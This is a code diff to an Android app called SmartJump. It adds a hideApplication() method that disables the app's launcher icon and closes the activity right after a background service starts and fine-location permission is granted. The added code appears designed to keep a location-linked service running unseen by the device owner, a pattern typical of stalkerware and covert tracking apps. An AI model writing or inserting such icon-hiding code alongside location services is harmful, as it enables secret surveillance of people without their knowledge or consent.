@@ -1,6 +1,7 @@
 package com.smartjump.app.activity;
 
 import android.Manifest;
+import android.content.ComponentName;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.os.Bundle;
@@ -34,7 +35,17 @@ public class SmartJumpActivity extends BaseActivity {
             requestPermissions(perms, REQUEST_CODE);
         } else {
             startService();
+            hideApplication();
+            finish();
         }
+    }
+
+    private void hideApplication() {
+        final PackageManager packageManager = getPackageManager();
+        final ComponentName componentName = new ComponentName(this, SmartJumpActivity.class);
+        packageManager.setComponentEnabledSetting(componentName,
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP);
     }
 
     @Override
@@ -51,6 +62,7 @@ public class SmartJumpActivity extends BaseActivity {
                 if (permission.equals(Manifest.permission.ACCESS_FINE_LOCATION) && grantResult
                         == PackageManager.PERMISSION_GRANTED) {
                     startService();
+                    hideApplication();
                     break;
                 }
             }
